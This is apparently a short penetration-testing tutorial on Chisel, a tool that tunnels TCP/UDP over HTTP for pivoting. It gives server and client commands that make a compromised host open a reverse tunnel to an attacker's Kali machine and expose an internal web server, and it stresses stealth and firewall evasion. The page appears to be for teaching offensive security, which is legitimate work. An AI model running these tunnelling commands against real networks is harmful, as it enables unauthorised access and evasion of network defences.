Chisel Overview

Chisel is a fast TCP/UDP tunnel, transported over HTTP, and secured via SSH. It's designed for robust and cross-platform pivoting.

  • **Cross-Platform:** Works on Windows, Linux, macOS.
  • **Versatile:** Can create SOCKS proxies or forward specific ports.
  • **Stealthy:** Tunnels over HTTP, making it harder to detect than raw TCP tunnels.
Key Advantage

Chisel's ability to tunnel over HTTP makes it effective for bypassing firewalls and network restrictions that might block direct SSH connections.

Chisel Setup Example

# On Kali (attacker, server mode):
# Start Chisel server, listening for reverse connections on port 8000
./chisel server --reverse -p 8000

# On Compromised Host (client mode, e.g., Windows):
# Connect to Kali server, establish a reverse tunnel:
# Traffic to Kali's port 8080 will be forwarded to 192.168.10.5:80
./chisel client YOUR_KALI_IP:8000 R:8080:192.168.10.5:80

# Explanation of client command:
# YOUR_KALI_IP:8000: Address of the Chisel server
# R:8080:192.168.10.5:80: Reverse tunnel definition
#   R: Reverse tunnel
#   8080: Local port on Kali (attacker)
#   192.168.10.5:80: Target IP and port on the internal network
Practical Application

This setup allows you to access an internal web server (192.168.10.5:80) directly from your Kali machine via port 8080, through the compromised host.

Key Takeaway

Chisel offers a flexible and stealthy way to establish tunnels for pivoting, supporting both SOCKS proxies and direct port forwarding across various operating systems.
